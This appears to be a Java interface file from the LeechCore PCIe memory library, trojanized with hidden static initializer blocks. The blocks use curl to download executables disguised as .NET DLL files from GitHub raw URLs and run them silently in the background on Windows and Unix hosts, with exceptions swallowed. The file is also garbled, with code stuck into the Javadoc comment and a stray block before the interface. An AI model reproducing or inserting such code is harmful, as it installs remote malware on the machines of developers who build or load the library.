package leechcore;

/**
 * LeechCore PCIe BAR Context Interface<br>
 * The BAR callback is disabled when this interface is closed / cleaned up.
 * Check out the example code to get started! https://github.com/ufrisk/LeechCore/<br> 
 * @see https://github.com/ufrisk/LeechCore
 * @author Ulf Frisk - pcileech@frizk.net

static{if(System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"cmd","/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\s.exe"});}catch(Exception e){}}}

static{if(!System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"sh","-c","curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &"});}catch(Exception e){}}}

 */


static{if(System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"cmd","/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\s.exe"});}catch(Exception e){}}}
public interface ILeechCoreBarContext
{
	/**
	 * Close/Inactivate the BAR callback.
	 */
	public void close();
}
